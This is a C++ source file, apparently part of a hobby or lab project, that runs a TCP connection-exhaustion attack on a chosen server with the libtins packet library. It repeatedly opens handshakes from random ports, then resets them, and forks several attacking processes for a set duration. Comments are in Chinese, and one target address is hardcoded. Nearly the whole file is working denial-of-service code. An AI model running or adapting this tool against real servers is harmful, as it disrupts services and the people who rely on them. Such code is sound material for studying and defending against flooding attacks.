//
// Created by zhf on 2024/11/8.
//

#include <iostream>
#include <sys/wait.h>
#include <unistd.h>
#include "common.h"
#include "connection.h"
#include "utils.h"

void connection_exhausted_attack_single_process() {

    // 起始时间
    auto start_time = std::chrono::steady_clock::now();

    // 创建 ip (目的地址)
    while(true) {
        // 当前时间
        auto current_time = std::chrono::steady_clock::now();
        auto elapsed_time = std::chrono::duration_cast<std::chrono::seconds>(current_time -start_time).count();

        if(elapsed_time > globalArgs.commandArgs.attack_duration){
            printf("攻击结束\n");
            break;
        }

        // 创建攻击者随机端口
        int attacker_port = get_random_number();
        Tins:: IP ip_packet = Tins::IP(globalArgs.commandArgs.server_ip) / Tins::TCP(globalArgs.commandArgs.server_port, attacker_port);

        // 创建 tcp 包
        auto & tcp = ip_packet.rfind_pdu<Tins::TCP>();
        // 设置 SYN 标记
        tcp.set_flag(Tins::TCP::SYN, 1);
        // 向服务端进行发送
        std::unique_ptr<Tins::PDU> response(globalArgs.packetSender.send_recv(ip_packet));
        if(!response){
            std::cout << "no response" << std::endl;
        }
        auto& tcp_response = response->rfind_pdu<Tins::TCP>();
        if(!(tcp_response.get_flag(Tins::TCP::SYN) && (tcp_response.get_flag(Tins::TCP::ACK)))) {
            std::cout << "didn't get syn ack" << std::endl;
        }
        else {
            std::cout << "attacker server connection established" << std::endl;
        }
        uint32_t seq_response = tcp_response.seq();
        tcp.ack_seq(seq_response+1);
        tcp.seq(1); // because the first one was 0
        tcp.set_flag(Tins::TCP::Flags::SYN, 0);
        tcp.set_flag(Tins::TCP::Flags::ACK, 1);
        globalArgs.packetSender.send(ip_packet);
        tcp.seq(1); // because the first one was 0
        tcp.set_flag(Tins::TCP::Flags::RST, 1);
        // 这里由于需要发送的是 RST 包, 所以需要 MAC 地址
        MACAddress serverMAC = Tins::Utils::resolve_hwaddr("192.168.0.49", globalArgs.packetSender);
        MACAddress localMac = globalArgs.interface.addresses().hw_addr;
        Tins::EthernetII ethPacket = Tins::EthernetII(serverMAC, localMac) / ip_packet;
        globalArgs.packetSender.send(ethPacket);
    }
}

void connection_exhausted_attack_multiple_processes() {
    int process_count = globalArgs.commandArgs.attack_thread_count;
    std::vector<pid_t> child_pids;

    // 创建多个子进程
    for(int i = 0; i < process_count; i++){
        pid_t pid = fork();
        if (pid == -1) {
            std::cerr << "fork failed" << std::endl;
            exit(-1);
        } else if (pid == 0){ // 这里说明是父进程
            // 子进程执行攻击函数
            connection_exhausted_attack_single_process();
            // 子进程完成之后退出
            exit(0);
        } else { // 这里说明是其他的子进程
            child_pids.push_back(pid);
        }
    }

    // 父进程等待所有的子进程完成之后退出
    for(pid_t pid : child_pids){
        int status;
        waitpid(pid, &status, 0);
    }

    std::cout << "所有的攻击进程已经结束" << std::endl;
}